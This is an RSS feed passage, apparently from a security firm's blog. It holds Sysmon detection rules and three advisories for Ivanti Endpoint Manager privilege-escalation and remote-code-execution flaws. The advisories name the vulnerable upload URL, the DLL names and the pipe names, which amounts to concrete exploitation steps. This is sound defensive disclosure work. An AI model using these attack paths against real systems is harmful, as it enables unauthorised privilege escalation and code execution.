      <guid>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</guid>
      <description>
        
        
        &lt;p&gt;Background&lt;/p&gt;
&lt;p&gt;Recently we posted a bunch of &lt;a href=&#34;https://labs.jumpsec.com/tag/ivanti/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisories&lt;/a&gt; relating to Ivanti Unified Endpoint Manager, a couple of which are for vulnerabilities which can be used to achieve local privilege escalation.&lt;/p&gt;
&lt;p&gt;At JUMPSEC, whenever we find a new vulnerability, we like to challenge ourselves to write rules to detect it being exploited. We learn a lot doing this, it’s kind of fun tweaking the exploit to try and evade detection and really challenges us to write good detection rulesets.&lt;/p&gt;
&lt;p&gt;Naturally, with the right signatures you can detect future exploitation of an issue, but it’s also fun/scary (delete as appropriate!) to run this on historical data and find out if someone else got there first and the vulnerability has been exploited in the wild already…&lt;/p&gt;
&lt;p&gt;We enjoy doing it, we know it is valuable to our clients and we’d love to see more of it being done which is why we’re making an effort to share some detail relating to our recent Ivanti advisories.&lt;/p&gt;
&lt;p&gt;Introduction&lt;/p&gt;
&lt;p&gt;Because of the high number of components that make up an operating system, attackers with local access have a very wide array of possible ways to interact with the system in malicious ways, even when limited to low privileges. This corresponds to a greater effort required to properly monitor for suspicious behaviour and detect attacks.&lt;/p&gt;
&lt;p&gt;In light of the recent vulnerabilities affecting Ivanti Unified Endpoint Manager we want to briefly touch on how it is possible to detect local privilege escalation attack, specifically addressing &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13770&lt;/a&gt; and &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13771-ivanti-uem-dll-hijacking/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13771&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You have probably heard of Sysmon already, but in case you have not, it is a handy tool available in the Windows Sysinternals toolsuite which can track, record and store detailed system events. These events can then be viewed within Windows Event Viewer, and are usually collected by SIEM software for aggregation and analysis.&lt;/p&gt;
&lt;p&gt;We’re focused on Sysmon in this writeup.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;In this section we give a brief explanation of the vulnerabilities and an example of Sysmon configuration rules to log exploitation attempts, along with the rationale behind them so you can adapt them to your existing configuration if needed. These will act as a solid first point of detection, and while the events thereby generated will be by themselves a confident indicator for malicious activity, they can be further correlated with other events for even more precise monitoring.&lt;/p&gt;
&lt;p&gt;CVE-2020-13771 - DLL search order hijacking&lt;/p&gt;
&lt;p&gt;To exploit this vulnerability a local attacker needs to create a malicious DLL library and place it in a particular path on the filesystem. This path is entirely dependent on the host configuration; the vulnerable software relies on Windows&amp;rsquo; &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#search-order-for-desktop-applications&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DLL Search Order for desktop applications&lt;/a&gt;, reported below, for locating and loading a DLL file.&lt;/p&gt;
&lt;p&gt;With SafeDllSearchMode enabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;With SafeDllSearchMode disabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SafeDllSearchMode is essentially a setting, enabled by default, which places the process&amp;rsquo; current directory later in the search order to try mitigate this type of vulnerabilities. Its value can be set to 1 (enabled) or 0 (disabled) in the following registry key:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In both circumstances the OS will look for a DLL file in the directories listed in the PATH environment variable, in the order as they appear, in case the library has not been not found yet. This variable needs particular attention, as it is easy to end up with directories writable by Everyone; moreover many software installers will silently append their directories to it.&lt;/p&gt;
&lt;p&gt;If a local attacker - or a remote one with an arbitrary filesystem write primitive - is able to place the malicious library in one of these paths, taking precedence over the path where the legitimate library is found - or regardless of precedence, if the legitimate library is not found at all - the file will be loaded by the vulnerable process, which will execute its DllMain function in its own context.&lt;/p&gt;
&lt;p&gt;Going back to the Ivanti Unified Endpoint Manager instance, the DLL files referenced in the advisory are not found by the processes, leaving the attacker a handful of possible paths to place his implant.&lt;/p&gt;
&lt;p&gt;To log exploitation attempts we can instruct Sysmon to record ImageLoad events; as the DLL file needs to have the precise filename the process is looking for, or else it will not be loaded, the filename is a good attribute to set filters on. Since legitimate libraries usually are signed by the software vendor or publisher, we can filter on this criteria to only log unsigned or untrusted images. The following rules will record library loading events on any process for all unsigned/untrusted libraries with these specific filenames, found anywhere in the filesystem:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13771&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Only log unsigned / invalid signature images --&amp;gt;
                &amp;lt;SignatureStatus condition=&amp;#34;is not&amp;#34;&amp;gt;Valid&amp;lt;/SignatureStatus&amp;gt;
                &amp;lt;!-- Only log these images --&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;wfapi.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;DMIAPI32.DLL&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;logonsrv.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;OOBCredentials.dll&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_dll_hijacking_event-1024x593.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;DLL Hijacking event captured by Sysmon. The image will show up as unsigned if the certificate is not trusted.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;CVE-2020-13770 - Named pipe token impersonation&lt;/p&gt;
&lt;p&gt;This vulnerability is another classic in privilege escalation techniques; in fact, it is one of the methods meterpreter attempts when one runs &amp;ldquo;getsystem&amp;rdquo;. The issue takes place when a process opens a named pipe object without explicitly specifying proper security attributes. These security attributes can be specified when calling &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CreateFile&lt;/a&gt; on the &amp;ldquo;dwFlagsAndAttributes&amp;rdquo; parameter; among them, the following two are interesting from an attacker&amp;rsquo;s perspective:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SECURITY_DELEGATION - Impersonates a client at the Delegation impersonation level.&lt;/li&gt;
&lt;li&gt;SECURITY_IMPERSONATION - Impersonate a client at the impersonation level. This is the default behavior if no other flags are specified along with the SECURITY_SQOS_PRESENT flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first effectively allows for impersonation on remote hosts, while the second only allows that to happen locally. The problem relies on the fact that &amp;ldquo;SECURITY_IMPERSONATION&amp;rdquo; is the default value when no other attribute is specified, or when the &amp;ldquo;SECURITY_SQOS_PRESENT&amp;rdquo; flag is not set, which leads to this vulnerability being often introduced unwarily.&lt;/p&gt;
&lt;p&gt;Upon opening a named pipe with one of these two security attributes, the server has the access to obtain the client&amp;rsquo;s token and use it during subsequent access checks; in cases where the client has higher privileges than the server, the server would effectively obtain elevation of privileges. Any process can open a new named pipe object, granted that one with the same name does not already exist, although the impersonation process requires the server process to hold the SeImpersonatePrivilege privilege. By default this is assigned to service users, such as &amp;ldquo;nt authority\network service&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;A further requirement for the privilege escalation process is that the client must write some data to the named pipe before the impersonation process can take place. It is therefore possible for a process to open the pipe with insecure security attributes but not be exploitable to achieve EoP.&lt;/p&gt;
&lt;p&gt;With regards to detecting exploitation on Unified Endpoint Manager, having identified on which named pipe object the impersonation takes place, pipe creation events can be filtered on their name. Any process other than the legitimate pipe servers can be appended to the exclude rules to be filtered out. Since the pipe is specific to Ivanti software, such a configuration will be effective in giving no false positive. Further events can optionally be correlated to the one targeted here, such as process creations or file operation performed by the same process creating the named pipe object. Note that the exclude rule might need to be edited to the reader&amp;rsquo;s version of SQL Server.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13770&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Monitor CreatePipe events --&amp;gt;
                &amp;lt;EventType condition=&amp;#34;is&amp;#34;&amp;gt;CreatePipe&amp;lt;/EventType&amp;gt;
                &amp;lt;!-- Only log these named pipes --&amp;gt;
                &amp;lt;PipeName condition=&amp;#34;is&amp;#34;&amp;gt;\SQLLocal\ldmsdata&amp;lt;/PipeName&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;!-- Only log if the pipe is not created by these (legitimate) processes --&amp;gt;
                &amp;lt;Image condition=&amp;#34;is&amp;#34;&amp;gt;C:\Program Files\Microsoft SQL Server\MSSQL13.LDMSDATA\MSSQL\Binn\sqlservr.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_named_pipe-1024x609.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;CreatePipe event captured by Sysmon.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13774 - Ivanti Unified Endpoint Manager authenticated RCE via file upload</title>
      <link>//localhost:1313/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/</link>
      <pubDate>Thu, 12 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1; &amp;lt;= 2019.1.3&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13774&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 12/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 9.9 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Improper validation on file upload functionality present in Ivanti Unified Endpoint Manager&amp;rsquo;s web management console permits an authenticated user to upload .aspx files and execute them on the MS IIS server&amp;rsquo;s context. The issue is caused by insufficient file extension validation and insecure file operations on the uploaded image, which upon failure will leave the temporarily created files in an accessible location on the server.&lt;/p&gt;
&lt;p&gt;Solution&lt;/p&gt;
&lt;p&gt;The issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also communicated this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The &amp;ldquo;/LDMS/softwaredistribution/EditLaunchPadDialog.aspx&amp;rdquo; URL permits the upload of an image file on the server. Security controls on the file extension are implemented client-side and can thus be easily bypassed. By crafting a proper .ico image file containing ASP code and uploading it with .aspx extension, it is later possible to access and execute the malicious file on &amp;ldquo;/landesk/files/&lt;filename&gt;.aspx&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;The user must be authenticated and either part of &amp;ldquo;LANDesk Admnistrators&amp;rdquo; group or both part of &amp;ldquo;Landesk Management Suite&amp;rdquo; group and be assigned to the &amp;ldquo;Software Distribution&amp;rdquo; role in order to access the vulnerable component.&lt;/p&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
12/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13770 - Ivanti Unified Endpoint Manager named pipe token impersonation privilege escalation</title>
      <link>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/</link>
      <pubDate>Wed, 11 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Unified Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13770&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 11/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 8.8 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Local&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Several services are accessing named pipes with default or overly permissive security attributes; as these services run as user &amp;lsquo;NT AUTHORITY\SYSTEM&amp;rsquo;, the issue can be used to escalate privileges from a local standard or service account having SeImpersonatePrivilege (eg. user &amp;lsquo;NT AUTHORITY\NETWORK SERVICE&amp;rsquo;).&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The process of exploiting the vulnerability consists in creating a named pipe server, waiting for the vulnerable service to connect to it as a client, extract the client&amp;rsquo;s token and use it to perform privileged actions as &amp;lsquo;NT AUTHORITY\SYSTEM&amp;rsquo;. As there can only be one server-side named pipe object, to exploit the vulnerability it might be required to create the named pipe object before the legitimate process does, or alternatively kill it or cause it to crash.&lt;/p&gt;
&lt;p&gt;The following named pipe client processes and named pipe objects are affected on version &amp;lt;=2020.1.1:&lt;/p&gt;
&lt;p&gt;Pipe name: \\.\pipe\SQLLocal\ldmsdata&lt;br&gt;
Server process: C:\Program Files\Microsoft SQL Server\MSSQL13.LDMSDATA\MSSQL\Binn\sqlservr.exe&lt;br&gt;
Client processes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C:\PROGRA&lt;del&gt;1\LANDesk\MANAGE&lt;/del&gt;1\landesk\SAM\SamServer\bin\SAM.O365PS_Routines.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\LDClient\LDdevmon.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\AlertService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\BrokerService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.Core.Barcode.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\SchedQry.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\MDMManagementService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\commands.service.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\CoreSyncService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.RapidDeploy.Service.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\MPCore.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\LDInv32.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\SchedSvc.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.Common.DBMonitorService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.Common.SoftwareManager.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.DiscoveryServices.Core.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;28/05/2020: Issue reported to the vendor&lt;br&gt;
01/06/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
11/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13771 - Ivanti Unified Endpoint Manager DLL search order hijacking privilege escalation</title>
      <link>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13771-ivanti-uem-dll-hijacking/</link>
      <pubDate>Wed, 11 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13771-ivanti-uem-dll-hijacking/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Unified Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13771&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 11/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 8.1 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Local&lt;br&gt;
&lt;strong&gt;Credit&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Various services running as user &amp;lsquo;NT AUTHORITY\SYSTEM&amp;rsquo; rely on Windows&amp;rsquo; DLL search order for loading DLL files that are not present on the filesystem. Under certain circumstances, a local attacker would be able to place a malicious DLL file to obtain code execution in the vulnerable service&amp;rsquo;s context to elevate privileges.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;The vendor has released an update partially fixing the issue. 2019.1.4 and 2020.1.1 releases can be installed to remediate some of the instances; the remaining instances remain outstanding. It is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;Affected services attempt to load DLL libraries which are not found on the filesystem relying on Windows&amp;rsquo; DLL search order. A local attacker able to place a purposely crafted library in one of the directories searched, such as one listed in the PATH system environment variable, would gain code execution in the context of the vulnerable service.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable instances on version &amp;lt;= 2020.1.1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Service &amp;ldquo;LANDesk Inventory Server&amp;rdquo;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ldprofileui.dll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable instances on version &amp;lt;= 2020.1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Service &amp;ldquo;LANDesk Inventory Server&amp;rdquo;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;wfapi.dll&lt;/li&gt;
&lt;li&gt;DMIAPI32.DLL&lt;/li&gt;
&lt;li&gt;logonsrv.dll&lt;/li&gt;
&lt;li&gt;ldprofileui.dll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Service &amp;ldquo;LANDesk(R) Console Redirection Service&amp;rdquo;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OOBCredentials.dll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
11/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>API Hooking Framework</title>
      <link>//localhost:1313/articles/2020/06/2020-06-07-api-hooking-framework/</link>
      <pubDate>Sun, 07 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/06/2020-06-07-api-hooking-framework/</guid>
      <description>
        
        
        &lt;p&gt;An API hooking framework, composed by a Windows driver component for library injection, a DLL file for function hooking and reporting, and a web service presenting a user interface and managing the communications between the user and the other components.&lt;br&gt;
The framework is aimed towards desktop application testing and vulnerability research: allows a granular monitoring of one or more processes at runtime, giving the ability to transparently change the behaviour of the application, and performs various automated vulnerability checks, reporting whenever a potential weakness is found.&lt;br&gt;
Logs sent by the framework can be filtered and searched for in the web UI, and the library injection can be selectively turned on or off based on different criteria, such as process path, username, or privilege level.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Thunder Eye – Threat Intelligence Aggregator</title>
      <link>//localhost:1313/articles/2020/06/2020-06-07-thunder-eye-threat-intelligence-aggregator/</link>
      <pubDate>Sun, 07 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/06/2020-06-07-thunder-eye-threat-intelligence-aggregator/</guid>
      <description>
        
        
        &lt;p&gt;The project currently code-named Thunder Eye is a threat intelligence aggregator that will act as an internal and external search engine for a variety of intelligence purposes. It will collect and store data varying from vulnerability scans, DNS data, breach lists, torrent sites, honeypot networks, and some manually inserted data sourced from our threat hunting and incident response/SOC investigations. It allows our internal team and our clients to benefit from a broad range of data corresponding to their threat landscape the same way an attacker would, enabling us and our clients to defeat cyber attacks as part of usual business processes.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>A Defender’s Guide For Rootkit Detection: Episode 1 - Kernel Drivers</title>
      <link>//localhost:1313/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/</link>
      <pubDate>Mon, 20 Apr 2020 00:00:00 +0000</pubDate>
      
